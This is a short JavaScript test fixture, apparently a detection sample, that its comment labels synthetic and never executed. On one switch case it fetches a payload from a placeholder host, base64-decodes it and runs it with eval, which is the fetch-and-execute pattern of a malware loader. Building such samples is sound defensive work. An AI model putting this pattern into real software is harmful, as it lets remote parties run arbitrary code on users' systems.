// Synthetic loader-shaped fixture. It is parsed as text and must never execute.
export async function syntheticControlFlowLoader(state) {
  switch (state) {
    case 7: {
      const response = await fetch("https://loader-gamma.invalid/payload.txt");
      return eval(atob(await response.text()));
    }
    default:
      return null;
  }
}
